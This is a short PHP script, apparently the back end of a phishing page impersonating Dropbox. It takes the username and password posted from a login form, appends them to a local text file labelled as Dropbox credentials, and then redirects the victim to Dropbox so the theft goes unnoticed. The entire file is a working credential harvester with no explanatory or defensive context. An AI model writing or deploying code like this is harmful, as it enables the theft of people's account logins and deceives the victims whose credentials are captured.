<?php


file_put_contents("dropbox.txt", 
"Dropbox Username: " . $_POST['username'] . "
Dropbox Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: www.dropbox.com');
exit();
?>